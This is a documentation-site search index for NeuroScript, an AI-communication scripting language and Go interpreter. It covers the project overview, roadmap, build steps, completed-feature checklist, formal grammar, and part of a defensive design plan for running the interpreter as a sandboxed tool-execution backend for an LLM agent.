{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"NeuroScript: A Toolkit for AI Communication","text":""},{"location":"#foundation","title":"Foundation","text":"<p>The world utterly depends on collaboration between humans, AI agents, and traditional computer programs. NeuroScript cuts through the friction in these hybrid systems, bridging the gap between ambiguous natural language and rigid code.</p> <p>Instead of relying on hidden 'chain-of-thought' or ad-hoc prompts, NeuroScript aims to:</p> <ul> <li>Provide a shared 'language' \u2013 a toolkit of simple, readable, and executable scripts and data formats.</li> <li>Capture procedures and information clearly, making complex workflows explicit and repeatable.</li> <li>Foster reliable collaboration between all participants (human, AI, or computer).</li> <li>Uplift lesser AI models allowing them to do the work of greater ones.</li> </ul> <p></p>"},{"location":"#quick-examples","title":"Quick Examples","text":"<p>NeuroScript (<code>.ns.txt</code> - Defining a simple action):</p> <pre><code>-- Defines a reusable \"skill\"\nDEFINE PROCEDURE GreetUser(user_name)\nCOMMENT:\n    PURPOSE: Greets the user.\n    INPUTS: - user_name (string).\n    OUTPUT: None.\nENDCOMMENT\n  -- Basic variable assignment and string operation\n  SET message = \"Hello, \" + user_name + \"!\"\n  -- Output the result\n  EMIT message\nEND\n</code></pre> <p>NeuroData Checklist (<code>.ndcl</code> - Tracking tasks):</p> <pre><code>:: type: Checklist\n:: version: 0.1.0\n:: description: Simple project task list.\n\n# Main Goals\n- [x] Define Core Problem\n- [ ] Design Solution\n  - [ ] Phase 1: Core language\n  - [ ] Phase 2: Basic tools\n- [ ] Implement &amp; Test\n</code></pre>"},{"location":"#dive-deeper","title":"Dive Deeper","text":"<ul> <li>Why NeuroScript? Read the motivation and benefits.</li> <li>Core Architecture: Understand the main components (script, data, go).</li> <li>Key Concepts &amp; Features: Explore the underlying principles and features.</li> <li>Language &amp; Data Specs:<ul> <li>For Senior Tech Staff / Architects: Review the NeuroScript Language Specification, the Formal Grammar Ideas, the NeuroData Overview, and the Agent Facilities Design.</li> <li>For All: Browse the specific NeuroData format specifications.</li> </ul> </li> <li>Using <code>neurogo</code>: See the Installation &amp; Setup guide.</li> <li>Code &amp; Examples:<ul> <li>For Developers: Browse the available Built-in Tools source, look at the examples in the library, and dive into the main Go source code.</li> </ul> </li> <li>Project Status &amp; Roadmap: Check the Development Checklist and the high-level Roadmap.</li> <li>Frequently Asked Questions: See the FAQ.</li> <li>Contributing: Read the contribution guidelines.</li> </ul>"},{"location":"#license","title":"License","text":"<p>This project is licensed under the MIT License - see the LICENSE file for details.</p>"},{"location":"#authors","title":"Authors","text":"<p>Authors:  Andrew Price (www.eggstremestructures.com),           Gemini 2.5 Pro (Exp) (gemini.google.com)  </p> <p>:: version: 0.1.6 :: dependsOn: docs/script spec.md, docs/development checklist.md :: Authors: Andrew Price, Gemini 2.5 Pro (Exp)  </p>"},{"location":"RoadMap/","title":"NeuroScript Development Roadmap","text":"<p>Version: 0.1.0 DependsOn: docs/development checklist.md HowToUpdate: Review the \"Planned Features\" in the checklist and synthesize major goals into phases here. Ensure alignment with the overall project goal.</p> <p>This roadmap outlines the high-level goals for NeuroScript development, driving the priorities in the <code>development checklist.md</code>.</p>"},{"location":"RoadMap/#overall-goal","title":"Overall Goal","text":"<p>Achieve Bootstrapping: Enable NeuroScript, executed by either the <code>neurogo</code> interpreter or an LLM, to manage its own development lifecycle. This includes using NeuroScript procedures (<code>.ns.txt</code> files) combined with <code>CALL LLM</code> and <code>CALL TOOL.*</code> to: * Find relevant skills (via Vector DB search). * Generate new NeuroScript code for skills or refactoring. * Check syntax and format NeuroScript code. * Manage skills within a Git repository (add, commit, branch). * Potentially build and test associated Go code (<code>neurogo</code> itself or tools).</p>"},{"location":"RoadMap/#development-phases","title":"Development Phases","text":""},{"location":"RoadMap/#phase-1-core-interpreter-language-foundations-near-term-focus","title":"Phase 1: Core Interpreter &amp; Language Foundations (Near-Term Focus)","text":"<ul> <li>Goal: Solidify the core NeuroScript language execution capabilities needed for complex, self-managing scripts.</li> <li>Key Targets:<ul> <li>Implement robust LLM context management (<code>CALL LLM</code>).</li> <li>Introduce NeuroScript-specific error handling (e.g., TRY/CATCH).</li> <li>Design and implement the <code>NeuroData</code> concept for structured data handling within scripts.</li> <li>Refine list/map operations if needed beyond basic access/iteration.</li> </ul> </li> </ul>"},{"location":"RoadMap/#phase-2-tooling-for-self-management-bootstrapping","title":"Phase 2: Tooling for Self-Management &amp; Bootstrapping","text":"<ul> <li>Goal: Build and refine the specific <code>TOOL.*</code> functions essential for NeuroScript to manage its own ecosystem.</li> <li>Key Targets:<ul> <li>Replace mock Vector DB with a real implementation (<code>TOOL.VectorUpdate</code>, <code>TOOL.SearchSkills</code>).</li> <li>Enhance Git tooling (<code>TOOL.GitAdd</code>, <code>TOOL.GitCommit</code>) with branching, status checks, pulling, and auto-indexing capabilities.</li> <li>Create <code>TOOL.NeuroScriptCheckSyntax</code> for validating script content programmatically.</li> <li>Develop <code>nsfmt</code> (either as a tool or a standard NeuroScript procedure) for code formatting.</li> <li>Finalize versioning conventions (<code>FILE_VERSION</code>, <code>LANG_VERSION</code>) and potentially automate updates via tooling.</li> <li>Embed core utility NeuroScripts (like <code>CommitChanges</code>) into the <code>neurogo</code> binary.</li> </ul> </li> </ul>"},{"location":"RoadMap/#phase-3-ecosystem-expansion-general-tooling","title":"Phase 3: Ecosystem Expansion &amp; General Tooling","text":"<ul> <li>Goal: Broaden NeuroScript's applicability by adding more general-purpose tools and integrations.</li> <li>Key Targets:<ul> <li>Add common utility tools (JSON parsing/manipulation, HTTP requests).</li> <li>Implement Markdown reading/writing tools.</li> <li>Develop tools for interacting with structured documents (e.g., hierarchical data).</li> <li>Add table manipulation tools.</li> <li>Explore integration with external services (e.g., Google Sheets, Google Docs).</li> </ul> </li> </ul>"},{"location":"RoadMap/#phase-4-advanced-features-long-term-vision","title":"Phase 4: Advanced Features &amp; Long-Term Vision","text":"<ul> <li>Goal: Explore more advanced language features and capabilities.</li> <li>Key Targets:<ul> <li>Implement self-testing features within NeuroScript.</li> <li>Enhance list manipulation capabilities.</li> <li>Investigate Prolog-style logic programming features.</li> <li>Add support for generating/manipulating other formats (e.g., SVG).</li> <li>Refine LLM interaction (e.g., patch application, armored data passing).</li> <li>Multi-Context Prompting (MCP) support.</li> </ul> </li> </ul>"},{"location":"build/","title":"YACC -- deprecated","text":"<p>go install golang.org/x/tools/cmd/goyacc@latest</p> <p>goyacc -o neuroscript.y.go -p \"yy\" neuroscript.y</p> <p>./neurogo/neurogo neurogo/skills HandleSkillRequest \"Create a NeuroScript skill that reverses a given input string\"</p>"},{"location":"build/#antlr-current","title":"ANTLR -- current","text":"<p>Install ANTLR and java</p> <p>In pkg/core do:</p> <p>java -jar antlr4-4.13.2-complete.jar  -Dlanguage=Go -o generated -visitor -listener -package core NeuroScript.g4</p> <p>./neurogo -debug-ast -debug-tokens skills Add 1 2</p> <p>./neurogo skills HandleSkillRequest \"Create a NeuroScript skill that reverses a given input string\"</p>"},{"location":"completed/","title":"Completed Checklist","text":""},{"location":"completed/#d-completed-features","title":"D. Completed Features","text":"<p>[x] neurogo able to execute basic ns (SET, CALL, RETURN, basic IF/WHILE/FOR headers and block execution) interpreter_simple_steps.go [x] Basic Arithmetic Evaluation (+, -, , /, %, , unary -) evaluation_operators.go [x] Basic Condition Evaluation (==, !=, &gt;, &lt;, &gt;=, &lt;=, NOT, AND, OR, truthiness) evaluation_logic.go [x] List ([]) and Map ({}) Literal Parsing &amp; Evaluation evaluation_main.go [x] List/Map Element Access (e.g., list[index], map[\"key\"]) evaluation_access.go [x] FOR EACH List Element Iteration interpreter_control_flow.go [x] FOR EACH Map Key Iteration interpreter_control_flow.go [x] FOR EACH String Character/Comma Iteration interpreter_control_flow.go [x] ELSE Block Execution interpreter_control_flow.go [x] Basic set of golang tools in neurogo (FS, Git, Mock Vector, Strings, Shell, Go fmt/build/test/check/mod, Metadata, Checklist, Blocks, Math, Lists) tools_list_register.go [x] In-memory vector DB implemented (mocked, VectorUpdate, SearchSkills) embeddings.go [x] LLM Integration via CALL LLM (Gemini) interpreter_simple_steps.go [x] Basic CLI Runner (neurogo) with debug flags config.go [x] neurogo skips loading ns files with errors gracefully parser_api.go [x] ns stored in git (manually, but tools support adding/committing) orchestrator.ns.txt [x] Bootstrap Skills: Create initial .ns.txt skills (HandleSkillRequest, CommitChanges, UpdateNsSyntax, etc.) UpdateNsSyntax.ns.txt (Note: CommitChanges likely superseded by TOOL.GitCommit) [x] Basic Core Syntax Parsing (DEFINE PROCEDURE, COMMENT:, SET, CALL, RETURN, END) neuroscript_parser.go [x] Structured Docstring Parsing (COMMENT: block content parsed into struct, includes LANG_VERSION) utils.go [x] Block Header Parsing (IF...THEN, WHILE...DO, FOR EACH...DO) neuroscript_parser.go [x] Block Termination Parsing (ENDBLOCK) neuroscript_parser.go [x] Line Continuation Parsing (Supported via \\ in SET prompt example) modify_and_build.ns.txt (Partially done) [x] Basic Expression Evaluation (String/Num/Bool Literals, Variables, LAST, Parentheses) evaluation_test.go [x] EVAL() Function Parsing &amp; Evaluation (Explicit Placeholder Resolution) evaluation_resolve.go [x] List ([]) and Map ({}) Literal Parsing &amp; Evaluation evaluation_main.go [x] List/Map Element Access (list[index], map[\"key\"]) evaluation_access.go [x] Basic Arithmetic Evaluation (+, -, , /, %, , unary -) evaluation_operators.go [x] String Concatenation (+) evaluation_operators.go [x] Basic Condition Evaluation (==, !=, &gt;, &lt;, &gt;=, &lt;=, truthiness) evaluation_logic.go [x] Logical Operators (AND, OR, NOT - includes short-circuiting) evaluation_logical_bitwise_test.go [x] Bitwise Operators (&amp;, |, ^) evaluation_operators.go [x] Built-in Math Functions (LN, LOG, SIN, COS, TAN, ASIN, ACOS, ATAN) evaluations_functions_test.go [x] Operator Precedence Handling (via Grammar/AST) ast_builder_operators.go [x] Basic Interpreter Structure (Interpreter, Scope, RunProcedure) interpreter.go [x] Interpreter Block Execution (IF/ELSE/WHILE/FOR, RETURN propagation) interpreter_control_flow.go [x] Interpreter: Implement FOR EACH List Element Iteration interpreter_control_flow.go [x] Interpreter: Implement FOR EACH Map Key Iteration interpreter_control_flow.go [x] Interpreter: Implement FOR EACH String Character/Comma Iteration interpreter_control_flow.go [x] CALL LLM Integration (via llm.go) interpreter_simple_steps.go [x] CALL TOOL Mechanism &amp; Argument Validation/Conversion interpreter_simple_steps.go [x] File Version Declaration Parsing (FILE_VERSION) ast_builder_main.go [x] Basic FS Tools Implemented (ReadFile, WriteFile, ListDirectory, LineCountFile, SanitizeFilename) tools_fs.go [x] Basic Git Tools Implemented (GitAdd, GitCommit) tools_git.go [x] String Tools Implemented (StringLength, Substring, ToUpper, ToLower, TrimSpace, SplitString, SplitWords, JoinStrings, ReplaceAll, Contains, HasPrefix, HasSuffix, LineCountString) tools_string.go [x] Shell/Go Tools Implemented (ExecuteCommand, GoBuild, GoCheck, GoTest, GoFmt, GoModTidy) tools_shell.go [x] Mock Vector DB Tools (VectorUpdate, SearchSkills) embeddings.go [x] Basic CLI Runner (neurogo) app.go [x] Debug Flags and Conditional Logging in neurogo config.go [x] Graceful skipping of files with parse errors in neurogo parser_api.go [x] Fenced Code Block Extraction (including metadata) blocks_tool.go [x] Updated neurogo CLI args (-lib flag, proc/file target, agent mode flags) config.go [x] Metadata Extraction Tool (TOOL.ExtractMetadata) tools_metadata.go [x] Checklist Parser (String manipulation based) scanner_parser.go [x] Checklist Parser Tool (TOOL.ParseChecklistFromString) checklist_tool.go [x] NeuroData Block Parsing (Blocks tool) blocks_tool.go [x] Agent Mode Framework (Conversation, Security Layer, LLM Client, Tool Declarations) llm_tools.go [x] Allowlist/Denylist Loading and Enforcement in Agent Mode security.go [x] Basic Path Sandboxing (via SecureFilePath) security.go [x] Basic List Tools (ListLength, ListIsEmpty) tools_list_impl.go [x] Review versioning: Moved language version into docstring block (<code>LANG_VERSION:</code>) and clarified <code>FILE_VERSION</code> vs <code>:: version:</code> usage. metadata.md [x] Only load skills when requested (Implicitly true as they are loaded from files on demand or via lib path scan) [x] More tests for securefile root tools_fs_list_test.go [x] Allow LLM to use local tools back (Implemented via Agent Mode) security.go [x] Eval tool for arith etc (Arithmetic implemented as operators, not standalone EVAL tool for just math) [x] Files LLM allowed to see (Handled by Sandbox + Allowlist) config.go [x] LLM selection (Via SetModel method, default model constant) llm.go [x] neurogo as local agent for LLM app_agent.go [x] Restricted mode design exists restricted_mode.md (Marked as design exists) [x] Tools: Implement Real In-Memory Vector DB (Functional mock exists) embeddings.go [x] LLM Gateway: Make LLM endpoint/model configurable (Client supports SetModel, default constant exists) llm.go [x] Basic Math Tools (TOOL.Add, Subtract, Multiply, Divide, Modulo) tools_math.go [x] NeuroData Checklist Parser (String Manipulation) scanner_parser.go [x] Defined Errors for Checklist Parser (ErrMalformedItem, ErrNoContent) defined_errors.go [x] Tool for Checklist Parsing (TOOL.ParseChecklistFromString) checklist_tool.go</p>"},{"location":"formal%20script%20spec/","title":"NeuroScript: Formal specification","text":"<p>Version: 0.2.0 DependsOn: pkg/core/NeuroScript.g4 HowToUpdate: Review pkg/core/NeuroScript.g4 and update this EBNF accordingly.</p> <p>The language is currently defined by pkg/core/NeuroScript.g4. At some point, this file will come to be the offical definition, but not yet.</p> <p>(* EBNF-like notation for NeuroScript Language )</p> <p>:: Version: 0.2.0 ```ebnf</p> <p>( --- Top Level --- ) program               ::= { newline } [ file_version_decl ] { newline } { procedure_definition } { newline } EOF ; optional_newlines     ::= { newline } ; ( Used implicitly by parser/lexer where appropriate ) file_version_decl   ::= \"FILE_VERSION\" string_literal newline ;</p> <p>procedure_definition ::= \"DEFINE\" \"PROCEDURE\" identifier                          \"(\" [ param_list ] \")\" newline                          [ comment_block_marker ] ( Handled by lexer skip rule )                          statement_list                          \"END\" [ newline ] ;</p> <p>param_list_opt        ::= [ param_list ] ; ( Optional parameter list ) param_list            ::= identifier { \",\" identifier } ;</p> <p>( --- Statements --- ) statement_list        ::= { body_line } ; body_line             ::= ( statement newline ) | newline ; ( Statement or blank line )</p> <p>statement             ::= simple_statement | block_statement ;</p> <p>simple_statement      ::= set_statement                       | call_statement                       | return_statement                       | emit_statement ;</p> <p>block_statement       ::= if_statement                       | while_statement                       | for_each_statement ;</p> <p>set_statement         ::= \"SET\" identifier \"=\" expression ; call_statement        ::= \"CALL\" call_target \"(\" [ expression_list ] \")\" ; return_statement      ::= \"RETURN\" [ expression ] ; emit_statement        ::= \"EMIT\" expression ;</p> <p>( --- Block Statements --- ) if_statement          ::= \"IF\" expression \"THEN\" newline                           if_body=statement_list                           [ \"ELSE\" newline else_body=statement_list ]                           \"ENDBLOCK\" ;</p> <p>while_statement       ::= \"WHILE\" expression \"DO\" newline                           statement_list                           \"ENDBLOCK\" ;</p> <p>for_each_statement    ::= \"FOR\" \"EACH\" identifier \"IN\" expression \"DO\" newline                           statement_list                           \"ENDBLOCK\" ;</p> <p>call_target           ::= identifier | ( \"TOOL\" \".\" identifier ) | \"LLM\" ;</p> <p>( --- Expressions (Operator Precedence Defined by Order) --- ) expression            ::= logical_or_expr ; ( Entry point )</p> <p>logical_or_expr       ::= logical_and_expr { \"OR\" logical_and_expr } ; logical_and_expr      ::= bitwise_or_expr { \"AND\" bitwise_or_expr } ; bitwise_or_expr       ::= bitwise_xor_expr { \"|\" bitwise_xor_expr } ; bitwise_xor_expr      ::= bitwise_and_expr { \"^\" bitwise_and_expr } ; bitwise_and_expr      ::= equality_expr { \"&amp;\" equality_expr } ; equality_expr         ::= relational_expr { ( \"==\" | \"!=\" ) relational_expr } ; relational_expr       ::= additive_expr { ( \"&gt;\" | \"&lt;\" | \"&gt;=\" | \"&lt;=\" ) additive_expr } ; additive_expr         ::= multiplicative_expr { ( \"+\" | \"-\" ) multiplicative_expr } ; multiplicative_expr   ::= unary_expr { ( \"\" | \"/\" | \"%\" ) unary_expr } ;</p> <p>unary_expr            ::= ( \"-\" | \"NOT\" ) unary_expr                       | power_expr ;</p> <p>power_expr            ::= accessor_expr [ \"*\" power_expr ] ; ( Right-associative via recursion )</p> <p>accessor_expr         ::= primary { \"[\" expression \"]\" } ; ( Handles element access )</p> <p>primary               ::= literal                       | placeholder                       | identifier                       | \"LAST\"                       | function_call                       | \"EVAL\" \"(\" expression \")\"                       | \"(\" expression \")\" ;</p> <p>function_call         ::= ( \"LN\" | \"LOG\" | \"SIN\" | \"COS\" | \"TAN\" | \"ASIN\" | \"ACOS\" | \"ATAN\" )                           \"(\" [ expression_list ] \")\" ;</p> <p>placeholder           ::= \"{{\" ( identifier | \"LAST\" ) \"}}\" ;</p> <p>( --- Literals --- ) literal               ::= string_literal                       | number_literal                       | list_literal                       | map_literal                       | boolean_literal ;</p> <p>boolean_literal       ::= \"true\" | \"false\" ; list_literal          ::= \"[\" [ expression_list ] \"]\" ; map_literal           ::= \"{\" [ map_entry_list ] \"}\" ;</p> <p>expression_list_opt   ::= [ expression_list ] ; expression_list       ::= expression { \",\" expression } ;</p> <p>map_entry_list_opt    ::= [ map_entry_list ] ; map_entry_list        ::= map_entry { \",\" map_entry } ; map_entry             ::= string_literal \":\" expression ;</p> <p>( --- Lexer Tokens (Conceptual EBNF) --- ) file_version_keyword  ::= \"FILE_VERSION\" ; define_keyword        ::= \"DEFINE\" ; procedure_keyword     ::= \"PROCEDURE\" ; end_keyword           ::= \"END\" ; endblock_keyword      ::= \"ENDBLOCK\" ; comment_start_keyword ::= \"COMMENT:\" ; ( Start of COMMENT_BLOCK marker ) endcomment_keyword    ::= \"ENDCOMMENT\" ; ( End of COMMENT_BLOCK marker ) set_keyword           ::= \"SET\" ; call_keyword          ::= \"CALL\" ; return_keyword        ::= \"RETURN\" ; if_keyword            ::= \"IF\" ; then_keyword          ::= \"THEN\" ; else_keyword          ::= \"ELSE\" ; while_keyword         ::= \"WHILE\" ; do_keyword            ::= \"DO\" ; for_keyword           ::= \"FOR\" ; each_keyword          ::= \"EACH\" ; in_keyword            ::= \"IN\" ; tool_keyword          ::= \"TOOL\" ; llm_keyword           ::= \"LLM\" ; last_keyword          ::= \"LAST\" ; eval_keyword          ::= \"EVAL\" ; emit_keyword          ::= \"EMIT\" ; true_keyword          ::= \"true\" ; false_keyword         ::= \"false\" ; and_keyword           ::= \"AND\" ; or_keyword            ::= \"OR\" ; not_keyword           ::= \"NOT\" ; ln_keyword            ::= \"LN\" ; log_keyword           ::= \"LOG\" ; sin_keyword           ::= \"SIN\" ; cos_keyword           ::= \"COS\" ; tan_keyword           ::= \"TAN\" ; asin_keyword          ::= \"ASIN\" ; acos_keyword          ::= \"ACOS\" ; atan_keyword          ::= \"ATAN\" ;</p> <p>comment_block_marker  ::= \"COMMENT:\" ... \"ENDCOMMENT\" ; ( Handled/skipped by lexer ) number_literal        ::= digit+ [ \".\" digit+ ] ; string_literal        ::= '\"' { character | escape_sequence } '\"'                       | \"'\" { character | escape_sequence } \"'\" ; assign_operator       ::= \"=\" ; plus_operator         ::= \"+\" ; minus_operator        ::= \"-\" ; star_operator         ::= \"\" ; slash_operator        ::= \"/\" ; percent_operator      ::= \"%\" ; star_star_operator    ::= \"**\" ; ampersand_operator    ::= \"&amp;\" ; pipe_operator         ::= \"|\" ; caret_operator        ::= \"^\" ; lparen                ::= \"(\" ; rparen                ::= \")\" ; comma                 ::= \",\" ; lbrack                ::= \"[\" ; rbrack                ::= \"]\" ; lbrace                ::= \"{\" ; rbrace                ::= \"}\" ; colon                 ::= \":\" ; dot                   ::= \".\" ; placeholder_start     ::= \"{{\" ; placeholder_end       ::= \"}}\" ; eq_operator           ::= \"==\" ; neq_operator          ::= \"!=\" ; gt_operator           ::= \"&gt;\" ; lt_operator           ::= \"&lt;\" ; gte_operator          ::= \"&gt;=\" ; lte_operator          ::= \"&lt;=\" ;</p> <p>identifier            ::= letter { letter | digit | \"\" } ;</p> <p>( --- Implicit Lexer Rules --- ) line_comment          ::= ( \"#\" [^\"!\"\\n\\r] | \"--\" ) [^\\n\\r] ; ( Skipped ) hash_bang             ::= \"#!\" [^\\n\\r] ; ( Skipped ) newline               ::= \"\\r\"? \"\\n\" | \"\\r\" ; whitespace            ::= ( \" \" | \"\\t\" )+ ; ( Skipped ) letter                ::= \"a\"..\"z\" | \"A\"..\"Z\" | \"\" ; digit                 ::= \"0\"..\"9\" ; character             ::= ( Any character except quotes or backslash or newline ) ; escape_sequence       ::= \"\\\" ( '\"' | \"'\" | \"\\\" | \"n\" | \"r\" | \"t\" | unicode_escape ) ; unicode_escape        ::= \"u\" hex_digit hex_digit hex_digit hex_digit ; hex_digit             ::= digit | \"a\"..\"f\" | \"A\"..\"F\" ;</p>"},{"location":"llm_agent_facilities/","title":"Plan for Evolving NeuroGo into a Secure LLM Agent","text":""},{"location":"llm_agent_facilities/#introduction","title":"Introduction","text":""},{"location":"llm_agent_facilities/#purpose","title":"Purpose","text":"<p>This document presents a comprehensive technical plan for transforming the existing NeuroGo interpreter into a secure Large Language Model (LLM) agent, designated NeuroGo-as-llm-agent. The primary objective is to enable an LLM, such as Google's Gemini, to interact safely and effectively with a user's local environment by requesting NeuroGo to execute specific, pre-approved TOOL functions.</p>"},{"location":"llm_agent_facilities/#concept-recap","title":"Concept Recap","text":"<p>The core concept underpinning NeuroGo-as-llm-agent involves leveraging NeuroGo not as a direct executor of potentially complex NeuroScript procedures generated by an LLM, but as a constrained, local, and secure execution engine for discrete TOOL functions requested by the LLM. This shifts the execution model: instead of NeuroGo interpreting full NeuroScript logic potentially influenced or generated by an LLM, it focuses on executing well-defined, atomic tool operations on behalf of the LLM. The LLM handles the higher-level reasoning, planning, and task decomposition, while NeuroGo provides the secure interface to the local environment through its toolset, primarily utilizing the LLM's native function calling capabilities for communication. It's important to note that these agent capabilities are designed as an addition to NeuroGo's existing role as a NeuroScript interpreter, augmenting its functionality rather than replacing it.</p>"},{"location":"llm_agent_facilities/#criticality-of-security","title":"Criticality of Security","text":"<p>Security is the paramount design principle throughout this plan. Granting LLM agents, which are susceptible to manipulation techniques like prompt injection 1, the ability to interact with local system resources introduces significant risks. These include unauthorized data access or modification, execution of malicious commands, and system disruption.3 Key threats such as prompt injection 1 and insecure tool execution leading to excessive agency 3 must be rigorously addressed through architectural choices, strict validation, and layered security controls. The plan prioritizes establishing robust defenses against these and other vulnerabilities inherent in LLM-driven tool use.</p>"},{"location":"llm_agent_facilities/#scope-and-structure","title":"Scope and Structure","text":"<p>This plan encompasses the proposed architecture, the LLM interaction protocol (with a focus on Gemini Function Calling), detailed implementation steps within the NeuroGo Go codebase, a critical security design, analysis of key challenges and risks with mitigation strategies, phased development milestones, and an examination of how this capability aligns with the broader NeuroScript project goals. The subsequent sections detail each of these aspects.</p>"},{"location":"llm_agent_facilities/#section-1-proposed-architecture-for-neurogo-as-llm-agent","title":"Section 1: Proposed Architecture for NeuroGo-as-llm-agent","text":""},{"location":"llm_agent_facilities/#11-architectural-overview","title":"1.1. Architectural Overview","text":"<p>The proposed architecture positions NeuroGo as a specialized, secure \"Tool Execution Backend\" orchestrated by an external LLM. The interaction flow follows a controlled cycle: User -&gt; LLM (e.g., Gemini) -&gt; NeuroGo Agent -&gt; Secure Tool Execution -&gt; LLM -&gt; User. The LLM is responsible for natural language understanding, reasoning, planning the sequence of actions, and deciding which NeuroGo TOOL function needs to be invoked to accomplish a sub-task.6 NeuroGo, operating in agent mode, receives these requests, validates them against stringent security policies, executes the permitted tools within a sandboxed context, and returns the results to the LLM for synthesis into a final user response or further planning.</p> <p>This architecture aligns with several established patterns for building agentic systems:</p> <ul> <li>Augmented LLM 8: The system's core is the external LLM, augmented with the specialized capabilities provided by the NeuroGo toolset. NeuroGo acts as the secure execution layer for these augmentations.</li> <li>LLM + Tools + Memory 9: This pattern is directly applicable. The LLM provides the reasoning, NeuroGo implements the secure \"Tools\" execution layer, and NeuroGo itself must incorporate \"Memory\" management for conversation history and security context across interaction turns.</li> <li>Tool Use Pattern 10: The design explicitly follows this pattern, equipping the LLM with external functionalities (local system interaction) mediated by NeuroGo's tools.</li> <li>ReAct Pattern Elements 6: The fundamental interaction loop mirrors elements of the Reason-Act (ReAct) pattern: the LLM reasons, requests an action (NeuroGo tool call), receives an observation (tool result), and reasons again. Initially, the planning complexity within the LLM might be simpler than full ReAct implementations, but the core cycle is present.</li> </ul> <p>A fundamental aspect of this architecture is the clear separation of concerns. LLMs, while powerful reasoning engines, are inherently difficult to fully secure against prompt manipulation.11 Granting them direct execution capabilities on a local machine represents an unacceptable level of risk, falling under the category of \"Excessive Agency\".3 This architecture mitigates that risk by using the LLM for its strengths (reasoning, natural language processing, planning) and delegating the sensitive execution phase to NeuroGo, which operates under strict, locally enforced security controls. This minimizes the attack surface directly exposed by potential LLM vulnerabilities.</p>"},{"location":"llm_agent_facilities/#12-core-components","title":"1.2. Core Components","text":"<p>The NeuroGo-as-llm-agent system comprises several interacting components:</p> <ul> <li>User Interface/Client: (External to NeuroGo modifications) The application layer responsible for capturing user input and displaying LLM/agent responses.</li> <li>LLM API (e.g., Gemini): The external cloud-based service providing the core intelligence. It processes user prompts, manages conversational context (partially), plans execution steps, generates tool call requests via its function calling mechanism 12, and synthesizes final responses based on tool results.</li> <li>NeuroGo Agent Core (Go): The central piece undergoing modification. This component will:<ul> <li>Listen for and receive structured function call requests from the LLM API.</li> <li>Interact with the Conversation State Manager to retrieve history and store new turns.</li> <li>Invoke the Security Layer to validate incoming tool requests.</li> <li>Dispatch validated requests to the Tool Registry &amp; Executor.</li> <li>Format tool execution results into the structure expected by the LLM API.</li> <li>Manage the overall interaction loop with the LLM API.</li> </ul> </li> <li>Security Layer (Go Module within NeuroGo): A distinct logical (and potentially physical code module) layer acting as the gatekeeper for all LLM-initiated tool executions. Its responsibilities include:<ul> <li>Enforcing the Tool Allowlist configuration.</li> <li>Performing rigorous Argument Validation &amp; Sanitization.3</li> <li>Enforcing sandboxing constraints (e.g., ensuring paths are resolved via SecureFilePath).</li> <li>Applying context-aware restrictions (e.g., blocking TOOL.ExecuteCommand 13 when called by the LLM). This centralized approach simplifies security policy implementation, auditing, and future updates.1</li> </ul> </li> <li>Tool Registry &amp; Executor (Existing NeuroGo mechanism, enhanced): The existing NeuroGo component that registers available TOOL functions and executes their Go code. It requires enhancement to:<ul> <li>Accept security context information (e.g., sandboxing parameters, caller context).</li> <li>Ensure tools adhere to security constraints during execution.</li> </ul> </li> <li>Conversation State Manager (Go Module within NeuroGo): A new component responsible for maintaining the history of the interaction across multiple turns. This includes:<ul> <li>Storing user prompts, LLM text responses, LLM function call requests, and NeuroGo function execution results.15</li> <li>Maintaining the active security configuration (allowlist, sandbox root) for the current session.</li> <li>Formatting the history correctly for submission to the LLM API on each turn.</li> </ul> </li> </ul>"},{"location":"llm_agent_facilities/#13-interaction-flow-detailed-cycle","title":"1.3. Interaction Flow (Detailed Cycle)","text":"<p>The interaction between these components follows a precise cycle:</p> <ol> <li>The user submits a prompt via the User Interface/Client.</li> <li>The client sends the prompt, along with the current conversation history retrieved from NeuroGo's Conversation State Manager, to the designated LLM API (e.g., Gemini).</li> <li>The LLM analyzes the input and its available function declarations (representing NeuroGo TOOLs). If it determines an action requiring local interaction is needed, it formulates a tool call.</li> <li>The LLM API responds not with direct execution, but with a structured FunctionCall object specifying the target TOOL.FunctionName and the arguments it derived.12 This inability of the LLM to directly execute the function is a key architectural choice.12</li> <li>The NeuroGo Agent Core receives this FunctionCall object.</li> <li>NeuroGo passes the tool name and arguments to the Security Layer for validation.</li> <li>The Security Layer performs its checks sequentially:<ul> <li>Verifies the requested tool name is present in the configured allowlist for LLM invocation.</li> <li>Performs strict validation and sanitization on the arguments provided by the LLM, treating them as untrusted input.17</li> <li>Checks for and applies any context-specific restrictions (e.g., denying the call if it's a high-risk tool like TOOL.ExecuteCommand 13 in the LLM context 3).</li> </ul> </li> <li>If all security checks pass, the NeuroGo Agent Core dispatches the call, providing the validated (and potentially sanitized) arguments to the Tool Registry/Executor. Sandboxing mechanisms (like SecureFilePath) are typically enforced within the tool's implementation, guided by the security context established by the Security Layer.</li> <li>The requested TOOL function executes its logic, adhering to any imposed security constraints (e.g., accessing files only within the designated sandboxed directory).</li> <li>The TOOL function returns its result (e.g., file content, command output, success/error status) back to the NeuroGo Agent Core.</li> <li>NeuroGo formats this result into a FunctionResponse structure, suitable for the LLM API.12</li> <li>NeuroGo updates the Conversation State Manager, adding the FunctionCall and the corresponding FunctionResponse to the history.</li> <li>NeuroGo sends the FunctionResponse (along with the updated conversation history) back to the LLM API.</li> <li>The LLM processes the tool's result, incorporates it into its reasoning, and generates the next response. This might be another FunctionCall if more actions are needed, or a final natural language answer for the user.</li> <li>The LLM API sends this final response back to NeuroGo/client.</li> <li>The client displays the LLM's response to the user.</li> </ol> <p>This cycle repeats for each turn of the conversation requiring tool interaction. The choice of the Gemini API aligns well with this architecture. Its function calling mechanism, which returns a request object rather than attempting direct execution 12, naturally supports the secure delegation model by providing the necessary interception point for NeuroGo's security layer.</p>"},{"location":"llm_agent_facilities/#section-2-llm-interaction-protocol-via-gemini-function-calling","title":"Section 2: LLM Interaction Protocol via Gemini Function Calling","text":""},{"location":"llm_agent_facilities/#21-primary-mechanism-gemini-api-function-calling","title":"2.1. Primary Mechanism: Gemini API Function Calling","text":"<p>The primary and recommended protocol for communication between the LLM and NeuroGo will be the native Function Calling feature provided by the Gemini API.12 This mechanism allows NeuroGo to declare its available TOOLs to the LLM in a structured format.</p> <p>The implementation will require NeuroGo to generate FunctionDeclaration objects for each allowlisted TOOL. Each declaration must include 12: *   Name: The exact TOOL.FunctionName string. *   Description: A clear, concise natural language description of what the tool does, its purpose, and when it should be used. This description is critical for the LLM to accurately determine when to call the tool.12 This information can be derived from the mandatory COMMENT: blocks within NeuroScript procedures or associated 